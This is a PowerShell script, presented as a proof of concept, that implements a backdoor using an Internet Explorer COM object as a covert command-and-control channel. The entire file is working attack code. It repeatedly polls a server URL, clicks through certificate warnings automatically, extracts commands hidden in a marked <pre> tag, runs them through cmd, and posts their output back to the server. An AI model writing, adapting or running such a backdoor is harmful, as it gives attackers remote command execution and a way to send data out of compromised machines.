<#
powershell IE backdoor PoC

Uses an IE COM object as the C2 channel
Requires a php/aspx page with a <> tag in it. 
see http://khr0x40sh.wordpress.com/
for details

PARAMS:
[1] server - url to connect to.  Right now we are just looking for a comment in the source
[2] dwell  - time (sec) between polls
[3] debug  - show the debugging info as well as the IE window

Powered by
khr0x40sh
khr0x40sh.wordpress.com
#>
Param(
$server = "http://192.168.2.7/c2.php",
$dwell = 5,
$debug = $false
);

function runCMD{
Param(
$cmd_str = "ipconfig"
);
$out = ""

$ps = new-object System.Diagnostics.Process
$ps.StartInfo.Filename = "cmd"
$ps.StartInfo.Arguments = "/C " + $cmd_str
$ps.StartInfo.RedirectStandardOutput = $True
$ps.StartInfo.UseShellExecute = $false
$ps.start()
$ps.WaitForExit()
[string] $Out = $ps.StandardOutput.ReadToEnd();

$out.ToString()
}

function popIE{
        $ie = New-Object -COM internetexplorer.application

        $ie.visible = $debug  #visibility set by the debug param
        $data = ""
        while ($true)
        {
            $input = "data="+$data+"\r\n"
            $enc = New-Object System.Text.ASCIIEncoding 
            $pData = $enc.GetBytes($input) 
            $brFlgs = 14 #// no history, no read cache, no write cache
            $header = "Content-Type: application/x-www-form-urlencoded"
            
            $ie.navigate2($server, $brFlags, 0, $pData, $header)

            while ($ie.Busy)
            {
                #still loading so let's wait
                Sleep 3
            }
                
                #if we have a cert we need to force accept
                $ieHTML = $ie.Document.url
                if ($ieHTML.Contains("invalid"))
                {
                    $A = $ie.Document.getElementsByTagName("a")
                    foreach ($aa in $A)
                    {
                        if ($aa.innerText.toLower().Contains("continue to this website"))
                        {
                            $aa.Click();
                            break;
                        }
                    }
                }
                else
                {
                    #get our designated tag that contains our code
                    $tags = $ie.Document.IHTMLDocument3_getElementsByTagName("pre")
                    foreach ($tag in $tags)
                    {
                        #look for our command... this example looks for 3nc0d3
                        if ($tag.innerText.Contains("3nc0d3"))
                        {
                            $cmdArr = $tag.innerText -split "3nc0d3"
                            $data = runCMD $cmdArr[1]
                            break
                        }    
                    }
                    
                    #if searching for HTML comment use below:
                    
                }
            Sleep $dwell
        }
}

$ret = popIE
